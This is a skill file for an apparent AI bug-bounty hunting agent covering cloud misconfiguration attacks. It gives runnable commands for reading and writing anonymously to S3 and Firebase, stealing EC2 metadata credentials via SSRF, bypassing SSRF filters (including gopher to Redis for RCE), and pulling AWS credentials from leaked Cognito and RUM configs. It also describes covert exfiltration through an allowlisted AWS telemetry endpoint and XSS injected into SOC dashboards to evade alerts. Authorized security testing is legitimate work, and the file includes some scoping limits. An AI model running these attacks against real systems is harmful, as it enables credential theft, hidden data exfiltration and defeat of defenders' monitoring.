# Upstream source: cloud-misconfig (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/cloud-misconfig/SKILL.md`

---

---
name: cloud-misconfig
description: "Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. (Kubernetes/Docker exposure is owned by k8s; CI/CD pipeline attacks by cicd; post-credential IAM escalation by cloud-iam-deep.) Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services)."
---

## 16. CLOUD / INFRA MISCONFIGS

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

---

### Jenkins SSO-restriction failure → Script Console RCE
An exposed Jenkins that authenticates ANY personal Google/OAuth account (missing org-domain restriction) is full compromise: log in, then `/script` (Groovy console) = RCE, and `/credentials` + `/scriptText` = stored API tokens and source disclosure. Disclosed: reports/231460.

### Exposed message broker (RabbitMQ / AMQP) with default creds
Probe RabbitMQ management (`http://TARGET:15672/`, API `:15672/api/overview`) and AMQP `:5672`; try default `guest:guest` (works off-localhost when `loopback_users` is misconfigured) → queue/message read, vhost enumeration, management-plugin admin. Disclosed: reports/753602.

## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

---

## CloudWatch RUM Weaponization (2024-2026 surface)

AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` → Cognito Identity Pool chain.

### Detection — JS bundle fingerprints

**Snippet-style (most common, embedded in `<head>`):**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM-style (aws-rum-web package):**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

### Regex set for recon

```bash
# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .

# Extract identityPoolId (region:UUID)
grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
# Automate: pacu / enumerate-iam.py
```

Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.

**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:

```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.

**Chain C — DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK — including its already-granted Cognito permissions.

**Chain D — Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), inject XSS payloads into page-URL telemetry that fire when an SOC analyst views the CloudWatch dashboard, and inflate billable RUM event counts (financial DoS).

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| `guestRoleArn` with `*:*` or wildcards on multiple services | **Critical** (9.1+) | Anonymous full AWS access |
| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **High** (7.5-8.8) | Data exfil / RCE depending on resource |
| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **High** (8.0) | Privilege escalation primitive |
| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Medium** (5.3-6.5) | Sensitive data exposure via dashboard sharing |
| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Low-Medium** (4.3) | Dashboard poisoning, alert evasion, billing DoS |
| Self-hosted `cwr.js` on takeoverable subdomain | **Critical** (9.8) when chained | Persistent stored XSS across every customer page |

### Disclosed cases / authoritative writeups

No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is documented in research but specific named bug-bounty payouts on RUM are rare in public hacktivity. The pattern is "Cognito identity pool over-permission via embedded SDK" — RUM is one common embedding.

- **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020/2023)** — establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
- **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** — production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
- **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
- **aws-observability/aws-rum-web GitHub issues #213, #404** — community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.
6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---

## Related Skills & Chains

- **`subdomain-takeover`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `subdomain-takeover` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.


## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, infra signals to look
- OWASP Top 10:2025 moved Security Misconfiguration to A02 — cloud storage/identity permissions and exposed default content are explicitly in scope. Prioritize findings that yield data read, write, or credentials over checklist noise.
- SSRF-capable parameters first: `url`, `uri`, `path`, `dest`, `destination`, `redirect`, `feed`, `image_url`, `webhook`, `callback`, `pdf`/`render` URLs, file imports, link previews. Any server-side fetcher is an IMDS candidate.
- Fingerprint the cloud from headers/banners and asset data: `Server: awselb/2.0`, `X-Amzn-Trace-Id`, `x-goog-*`, `Azure`, `X-Nf-*`, `CF-*`. Determine whether the workload is AWS EC2/ECS/Lambda, GCP, or Azure before choosing metadata endpoints.
- Metadata endpoints to probe via the fetcher:
  - AWS IMDS: `http://169.254.169.254/latest/meta-data/`, `.../iam/security-credentials/`, `.../user-data`, IPv6 `[fd00:ec2::254]`
  - GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google`)
  - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true`)
- Determine IMDS version from response shape. IMDSv1 answers plain GETs with no token; IMDSv2 requires `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds` and then the token header. Datadog's 2025 study still finds instances allowing both, and flags the attack path "public EC2 running IMDSv1 + SSRF."
- Storage exposure sweep: public S3/GCS/Azure Blob listing, permissive bucket/container policies (public `PutObjectAcl`/`PutObject`), public RDS snapshots, public Lambda function URLs, public GCP Cloud Run, exposed Azure Function Apps. Check `?list-type=2`, anonymous `ListBucket`, and ACL/Policy GETs.
- Client-side secrets: JS bundles, `.env`, source maps, mobile APKs with hardcoded AWS keys / identity pool IDs / CloudWatch RUM config (see the existing CloudWatch RUM section).
- Exposed management surfaces: Jenkins script console, RabbitMQ/AMQP with default creds, Kubernetes dashboard/kubelet, docker.sock — but defer K8s/CI-specific exploitation to their owning skills.

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Classic IMDSv1 SSRF chain:
  ```
  GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/
  GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/
  ```
  Returns `AccessKeyId`, `SecretAccessKey`, `SessionToken` — export to AWS CLI and enumerate privileges (`aws sts get-caller-identity`, pacu, enumerate-iam.py). A 404 at `/iam/` means no role; 200-empty means a revoked role.
- IMDSv2 bypass conditions to test (rare but real): SSRF that allows arbitrary method + headers (e.g. CRLF injection, gopher:// to Redis/HTTP, redirect-based method/header smuggling), or a proxy that adds `X-aws-ec2-metadata-token` itself. Otherwise treat IMDSv2 as a blocker. Note IMDSv2 also drops requests carrying `X-Forwarded-For` for token fetches and enforces an IP hop-count limit.
- Blind/OOB variants: point the fetcher at a Collaborator/interactsh domain to prove outbound requests; use `gopher://` for protocol smuggling to internal Redis (unauthenticated -> RCE) or SMTP; DNS rebinding to defeat IP blocklists; redirect chains (`302` to `169.254.169.254`) when direct literals are filtered.
- Redirect/allowlist bypasses for the URL parameter: decimal/octal/hex IP forms, `0x7f000001`, `2130706433`, `[::ffff:127.0.0.1]`, `169.254.169.254.nip.io`, `@`-userinfo, `#`/`?` fragments, trailing dots, and DNS rebinding.
- Abusing Cognito Identity Pools from leaked JS: `GetId` -> `GetCredentialsForIdentity` with an unauthenticated role -> temporary AWS creds. Combine with the existing CloudWatch RUM weaponization section.
- Cloud metadata abuse seen in the wild (Mandiant UNC2903, F5 Labs March 2025 campaign): automated scanning for SSRF then IMDS credential theft. Use this as evidence of real-world exploitability, not theoretical impact.
- Anonymous bucket write test (authorized): `aws s3 cp marker.txt s3://bucket/ --no-sign-request` — but do not leave artifacts; use a clearly labeled marker and remove it.

### C. Validation / proof bar — how to confirm and avoid false positives
- A metadata URL reflecting in an error message is not credential theft. You must retrieve actual `AccessKeyId`/`SecretAccessKey`/`SessionToken` (or GCP/Azure equivalents) and prove they are valid (`aws sts get-caller-identity`).
- Confirm the SSRF is truly server-side: use a unique Collaborator domain and verify the DNS/HTTP callback originates from the target's infrastructure. Client-side redirects or browser fetches do not count.
- A public bucket listing empty objects is Low; a listing with sensitive data or a public-write ACL enabling arbitrary content is High/Critical. Show a concrete read/write, not just status codes.
- IMDSv2 presence: do not claim "IMDS exposure" if the token handshake blocks you. Document the headers/method you cannot control and move on — or chain with a real header-control primitive.
- When credentials are retrieved, stop at `get-caller-identity` and a minimal read demonstration; do not pivot broadly into the victim account. Rotate/purge any test artifacts and report the exact exposure window.
- Distinguish "metadata service reachable" from "role attached." A 200 at `/iam/` with an empty body means no usable credentials — not a finding.
- For RUM/Cognito chains, prove the guest role actually grants a sensitive action (e.g. S3 read, `sts:AssumeRole`) before claiming impact.

- Check the IMDS hop limit: IMDSv2 drops packets with IP TTL 1 at the instance. If the SSRF fetcher is a proxy one hop away, even a valid token may fail — note this when triaging "IMDS unreachable."
- For ECS/Fargate the credentials endpoint differs (`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` / `169.254.170.2`); for Lambda check env vars if code execution exists. Map the workload type before choosing the endpoint.
- GCP requires `Metadata-Flavor: Google` and Azure requires `Metadata: true`; a plain GET returns 403/404 — that is not evidence metadata is absent.
- Public EBS/RDS snapshots and AMIs are a separate high-yield surface: search for snapshots owned by the target account ID and check for unencrypted copies containing secrets.
- Cross-reference secrets from JS bundles and mobile apps with the cloud account ID — a leaked AWS key plus a permissive bucket policy can be faster than SSRF.
- Check S3 Block Public Access at account and bucket level; a bucket policy granting `s3:GetObject` to `Principal: *` is exploitable even if the ACL looks private.
- Validate with `aws sts get-caller-identity` immediately after retrieving credentials — it proves the creds are live and gives the account/ARN for scoping.
- Do not enumerate beyond the minimum needed to demonstrate impact; broad credential use against the victim account is out of scope for most programs.
- Bucket naming: if a bucket name appears in JS/APK, test `s3://<name>` anonymously across likely regions — a `ListBucket` failure in one region is not proof across all.
- Watch for IMDS abuse indicators: Wiz notes rare processes touching IMDS and unusual metadata paths are the highest-signal detections — use this for the defensive recommendation.
- The 2025 F5 Labs campaign showed a four-day burst of EC2 metadata exploitation; cite real-world scanning when a program questions impact.
- For GCP, a leaked service-account JSON is a direct credential (no SSRF needed) — activate it and enumerate project roles.

### D. Sources — numbered list of URLs you actually fetched
1. https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf
2. https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service
3. https://www.wiz.io/blog/imds-anomaly-hunting-zero-day
4. https://www.f5.com/labs/articles/campaign-targets-amazon-ec2-instance-metadata-via-ssrf
5. https://cloud.google.com/blog/topics/threat-intelligence/cloud-metadata-abuse-unc2903
6. https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds
7. https://www.datadoghq.com/blog/cloud-security-study-learnings-2025
